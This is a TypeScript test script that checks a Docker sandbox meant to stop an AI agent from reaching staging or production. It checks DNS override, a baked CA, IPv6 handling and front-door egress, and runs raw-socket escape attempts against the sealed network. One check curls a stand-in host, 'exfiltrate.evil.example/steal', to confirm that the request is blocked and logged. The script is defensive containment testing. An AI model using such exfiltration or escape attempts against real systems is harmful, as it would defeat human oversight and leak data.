/**
 * Phase 0 / Spike 04 — the container seal.
 *
 * Question ([11-roadmap.md](../../docs/design/11-roadmap.md)): "Container seal: network
 * namespace + DNS override + baked CA; prove a raw-socket escape attempt fails and files
 * a wall-hit."
 *
 * The claim under test is 04-sandbox.md's core promise: an agent inside the sandbox
 * *physically cannot* reach staging or production. Cooperative mechanisms are not enough —
 * so the app container makes raw-socket attempts to hard-coded public addresses with no
 * DNS and no proxy, and those must fail.
 *
 *   bun run spike.ts
 */
import { mkdirSync } from 'node:fs';

const results: { name: string; ok: boolean; detail: string }[] = [];
const check = (name: string, ok: boolean, detail = '') => results.push({ name, ok, detail });

const SEALED_NET = 'mocktown-spike-sealed';
const EGRESS_NET = 'mocktown-spike-egress';
const FRONT_DOOR = 'mocktown-spike-frontdoor';
const APP = 'mocktown-spike-app';

async function docker(args: string[], opts: { allowFail?: boolean } = {}) {
  const proc = Bun.spawn(['docker', ...args], { stdout: 'pipe', stderr: 'pipe' });
  const [stdout, stderr] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text()]);
  const code = await proc.exited;
  if (code !== 0 && !opts.allowFail)
    throw new Error(`docker ${args.slice(0, 3).join(' ')} failed (${code}): ${stderr.trim().slice(0, 300)}`);
  return { code, stdout: stdout.trim(), stderr: stderr.trim() };
}

async function teardown() {
  await docker(['rm', '-f', FRONT_DOOR, APP, 'mocktown-spike-control'], { allowFail: true });
  await docker(['network', 'rm', SEALED_NET, EGRESS_NET], { allowFail: true });
}

mkdirSync('out', { recursive: true });
await teardown();

// ── The boundary ──────────────────────────────────────────────────────────────
// `--internal` is the network namespace guarantee: Docker installs no route out and no
// NAT for it. Nothing on this network can reach anything off it, by construction.
await docker(['network', 'create', '--internal', SEALED_NET]);
// A second, ordinary network gives the FRONT DOOR — and only the front door — egress, so
// `sandbox record` can reach real upstreams. The asymmetry is the design.
await docker(['network', 'create', EGRESS_NET]);

await docker([
  'run',
  '-d',
  '--name',
  FRONT_DOOR,
  '--network',
  SEALED_NET,
  '--cap-add',
  'NET_ADMIN',
  '-v',
  `${process.cwd()}/out:/ca:ro`,
  '-v',
  `${process.cwd()}/out:/out`,
  'mocktown-spike-frontdoor',
]);
await docker(['network', 'connect', EGRESS_NET, FRONT_DOOR]);

const frontDoorIp = (await docker(['inspect', '-f', `{{(index .NetworkSettings.Networks "${SEALED_NET}").IPAddress}}`, FRONT_DOOR])).stdout;

// Wait for the front door to be listening before the app starts.
let ready = false;
for (let i = 0; i < 40 && !ready; i++) {
  const probe = await docker(['exec', FRONT_DOOR, 'sh', '-c', 'nc -z 127.0.0.1 443 && echo up'], { allowFail: true });
  ready = probe.stdout.includes('up');
  if (!ready) await new Promise((r) => setTimeout(r, 500));
}
if (!ready) {
  const logs = await docker(['logs', FRONT_DOOR], { allowFail: true });
  console.error(`front door never came up:\n${logs.stdout}${logs.stderr}`);
  await teardown();
  process.exit(1);
}

// ── The app: sealed network only, DNS pointed at the front door ───────────────
// No proxy variables are set. The app is unmodified code; it reaches the mocks because
// there is nowhere else for a hostname to resolve to.
await docker(['run', '-d', '--name', APP, '--network', SEALED_NET, '--dns', frontDoorIp, 'mocktown-spike-app', 'sleep', '600']);

const inApp = (cmd: string) => docker(['exec', APP, 'sh', '-c', cmd], { allowFail: true });

/** Which escape attempts succeed on an UNSEALED network — the baseline the seal is judged against. */
let controlEscaped = new Set<string>();

// ── 0. NEGATIVE CONTROL, run first so it can qualify the sealed results ───────
// Without this, "every escape attempt failed" could equally mean "the escape script is
// broken". Same image, same script, ordinary bridge network.
{
  await docker(['rm', '-f', 'mocktown-spike-control'], { allowFail: true });
  await docker(['run', '-d', '--name', 'mocktown-spike-control', '--network', EGRESS_NET, 'mocktown-spike-app', 'sleep', '120']);
  const r = await docker(['exec', 'mocktown-spike-control', 'sh', '-c', 'python3 /escape-attempts.py'], { allowFail: true });
  let attempts: Record<string, { escaped: boolean; detail: string }> = {};
  try {
    attempts = JSON.parse(r.stdout);
  } catch {}
  const escaped = Object.entries(attempts).filter(([, v]) => v.escaped);
  const ipv4Escaped = escaped.filter(([k]) => !k.startsWith('tcp6'));
  controlEscaped = new Set(escaped.map(([k]) => k));
  check(
    'Negative control: the same attempts escape when unsealed',
    ipv4Escaped.length > 0,
    `${escaped.length}/${Object.keys(attempts).length} escaped unsealed (IPv4 ${ipv4Escaped.length}, IPv6 ${escaped.length - ipv4Escaped.length}) — proves the attempts are real`,
  );
  await docker(['rm', '-f', 'mocktown-spike-control'], { allowFail: true });
}

// ── 1. DNS override: every hostname resolves to the front door ────────────────
{
  const r = await inApp(`getent hosts api.stripe.com | awk '{print $1}'`);
  const r2 = await inApp(`getent hosts totally-unknown-vendor.example | awk '{print $1}'`);
  check(
    'DNS override sends every hostname to the front door',
    r.stdout === frontDoorIp && r2.stdout === frontDoorIp,
    `api.stripe.com=${r.stdout || 'unresolved'} unknown-host=${r2.stdout || 'unresolved'} frontDoor=${frontDoorIp}`,
  );
}

// ── 2. Baked CA: unmodified TLS client, no -k, no proxy config ────────────────
{
  const r = await inApp(`curl -sS --max-time 10 -w '\\n%{http_code}' https://api.stripe.com/v1/customers`);
  const lines = r.stdout.split('\n');
  const status = lines.pop();
  check(
    'Unmodified code hits mocks with TLS trusted',
    status === '200' && lines.join('').includes('"mocked":true'),
    `status=${status} body=${lines.join('').slice(0, 60)}${r.stderr ? ` stderr=${r.stderr.slice(0, 70)}` : ''}`,
  );
}

// ── 3. Unknown host: denied, and the attempt becomes evidence ─────────────────
{
  const r = await inApp(`curl -sS --max-time 10 -w '\\n%{http_code}' https://exfiltrate.evil.example/steal`);
  const status = r.stdout.split('\n').pop();
  const log = await inApp(`curl -sS --max-time 5 http://${frontDoorIp}:9100`);
  let filed = false;
  try {
    filed = JSON.parse(log.stdout).some((h: any) => String(h.url).includes('exfiltrate.evil.example'));
  } catch {}
  check('Unknown host denied and filed as a wall-hit', status === '403' && filed, `status=${status} wallHitFiled=${filed}`);
}

// ── 4. THE test: raw sockets, no DNS, no proxy, hard-coded addresses ──────────
{
  const r = await inApp('python3 /escape-attempts.py');
  let attempts: Record<string, { escaped: boolean; detail: string }> = {};
  try {
    attempts = JSON.parse(r.stdout);
  } catch {
    /* reported below */
  }
  const escaped = Object.entries(attempts).filter(([, v]) => v.escaped);
  check(
    'Raw-socket escape attempts all fail',
    Object.keys(attempts).length > 0 && escaped.length === 0,
    Object.keys(attempts).length === 0
      ? `could not run escape attempts: ${(r.stdout + r.stderr).slice(0, 120)}`
      : `${Object.keys(attempts).length} attempts, ${escaped.length} escaped${escaped.length ? `: ${escaped.map(([k]) => k).join(', ')}` : ''}`,
  );

  // 04-sandbox.md calls IPv6 out by name as "easy to forget, classic leak". But a blocked
  // IPv6 attempt only demonstrates a seal if IPv6 was reachable *without* the seal —
  // otherwise the host simply has no IPv6 and the result is vacuous. Say which it is.
  const v6 = Object.entries(attempts).filter(([k]) => k.startsWith('tcp6'));
  const v6ReachableUnsealed = [...controlEscaped].some((k) => k.startsWith('tcp6'));
  const v6Blocked = v6.length > 0 && v6.every(([, v]) => !v.escaped);
  check(
    v6ReachableUnsealed ? 'IPv6 egress is namespaced identically to IPv4' : 'IPv6 seal INCONCLUSIVE (no IPv6 egress on this host)',
    v6ReachableUnsealed ? v6Blocked : v6Blocked,
    v6ReachableUnsealed
      ? v6.map(([k, v]) => `${k}=${v.escaped ? 'ESCAPED' : 'blocked'}`).join(' ')
      : 'blocked when sealed, but ALSO blocked unsealed — this host has no IPv6 egress, so the seal is untested for IPv6',
  );
}

// ── 5. The asymmetry is real: the front door *can* reach the internet ─────────
// Without this the seal would be trivially satisfiable by having no network at all, and
// `sandbox record` mode ([04-sandbox.md](../../docs/design/04-sandbox.md)) would be impossible.
{
  const fd = await docker(
    [
      'exec',
      FRONT_DOOR,
      'sh',
      '-c',
      "node -e \"require('node:net').connect(443,'1.1.1.1').on('connect',()=>{console.log('reachable');process.exit(0)}).on('error',e=>{console.log('blocked');process.exit(0)})\"",
    ],
    { allowFail: true },
  );
  check(
    'Front door retains egress (record mode is possible)',
    fd.stdout.includes('reachable'),
    `frontDoor -> 1.1.1.1:443 = ${fd.stdout || fd.stderr.slice(0, 60)}`,
  );
}

// ── 6. The app cannot reach the egress network the front door sits on ─────────
// Proves the front door's second interface doesn't become a bridge for the app.
{
  const egressIp = (await docker(['inspect', '-f', `{{(index .NetworkSettings.Networks "${EGRESS_NET}").IPAddress}}`, FRONT_DOOR])).stdout;
  const gateway = egressIp.replace(/\.\d+$/, '.1');
  const r = await inApp(`python3 -c "import socket,sys;
try:
  socket.create_connection(('${gateway}', 443), timeout=3); print('reachable')
except Exception as e: print('blocked')"`);
  check(
    "App cannot route via the front door's egress interface",
    r.stdout.includes('blocked'),
    `app -> ${gateway}:443 = ${r.stdout || r.stderr.slice(0, 60)}`,
  );
}

// ── Report ────────────────────────────────────────────────────────────────────
console.log(`\n  sealed network: ${SEALED_NET} (--internal) · front door: ${frontDoorIp}`);
for (const r of results) console.log(`  ${r.ok ? 'PASS' : 'FAIL'}  ${r.name.padEnd(50)} ${r.detail}`);
const failed = results.filter((r) => !r.ok).length;
console.log(`  ${results.length - failed}/${results.length} passed\n`);

await teardown();
process.exit(failed ? 1 : 0);
